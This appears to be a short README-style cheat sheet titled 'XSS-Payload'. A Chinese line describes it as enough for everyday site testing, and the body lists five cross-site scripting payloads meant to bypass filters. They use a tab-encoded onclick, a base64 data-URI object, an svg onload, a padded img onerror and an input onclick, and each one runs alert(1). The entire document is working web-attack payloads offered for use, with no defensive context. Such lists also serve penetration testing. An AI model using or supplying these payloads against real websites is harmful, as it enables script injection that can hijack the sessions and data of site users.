# XSS-Payload
日常日站够用，XSS Payload  

***

bypass Payload：
```
<dd%09onclick=alert(1)>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
<img/11111111111111111111111111111/src=x/onerror=alert(1)>
<input onclick=alert(1) value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>
```

